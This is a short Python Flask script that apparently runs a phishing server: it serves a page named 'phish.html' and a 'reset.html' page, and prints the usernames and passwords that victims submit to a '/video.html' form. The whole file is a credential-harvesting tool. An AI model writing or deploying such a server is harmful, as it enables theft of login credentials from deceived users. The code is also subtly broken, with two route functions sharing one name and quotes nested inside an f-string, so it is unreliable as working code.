from flask import Flask, request
import requests
app = Flask(__name__)

def load(file):
  return open(file).read()

@app.route('/')
def root():
  return load("phish.html")

@app.route('/reset.html')
def root():
  return load("reset.html")

@app.route('/video.html', methods=["POST"])
def video():
    if request.method == 'POST':
        print(f"Username: {request.form["username"]}\nPassword: {request.form["password"]}")
